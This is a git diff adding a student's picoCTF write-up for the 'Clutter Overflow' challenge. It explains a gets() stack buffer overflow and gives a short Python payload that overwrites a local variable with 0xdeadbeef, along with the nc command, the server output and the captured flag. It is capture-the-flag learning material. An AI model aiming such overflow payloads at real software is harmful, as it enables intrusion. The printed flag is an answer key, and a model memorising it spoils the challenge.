@@ -81,29 +81,67 @@ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
 
 ***
 
-# 3. 
-> 
+# 3. Clutter Overflow
+> Clutter, clutter everywhere and not a byte to use.
+nc mars.picoctf.net 31890
 
 ## Solution:
-- 
+- At first I expected a one-trick-pony solution (send a very long input) but that didn’t work.
+- Reading the source revealed a gets() call that reads user input into clutter without bounds checking, so clutter can overflow into adjacent stack variables.
+- The program checks a local long code against 0xdeadbeef, so the goal is to overwrite code with that value.
+- I constructed a binary payload (b"A"*256 + packed_value) and piped it to the challenge, but the test failed at first.
+  ```
+  import sys, struct
+  sys.stdout.buffer.write(b"A"*256 + struct.pack("<Q", 0xdeadbeef) + b"\n")
+  
+  ```
+- By incrementing the filler I found that overwriting succeeded when I sent 264 bytes before the value.
+- this most probably because the compiler is adding an 8 byte buffer itself
+- so the final payload was
+  ```
+  import sys, struct
+  sys.stdout.buffer.write(b"A"*264 + struct.pack("<Q", 0xdeadbeef) + b"\n")
+  ```
+- Sending that payload triggered the if (code == GOAL) branch and printed the flag.
 
 ```
+┌──(shaunakkli㉿shaunakkali)-[~]
+└─$ python3 cluovf.py | nc mars.picoctf.net 31890
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
+|\|______|===============|________________|/|""""""""""""""""""""""""""
+" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
+""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+My room is so cluttered...
+What do you see?
+code == 0xdeadbeef: how did that happen??
+take a flag for your troubles
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
 
 ```
 
 ## Flag:
 
 ```
-picoCTF{}
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
 ```
 
 ## Concepts learnt:
--
+- Calculating the exact offset needed to overwrite the local variable and write the value 0xdeadbeef
 
-## Notes:
--
-
-## Resources:
--
 
 ***
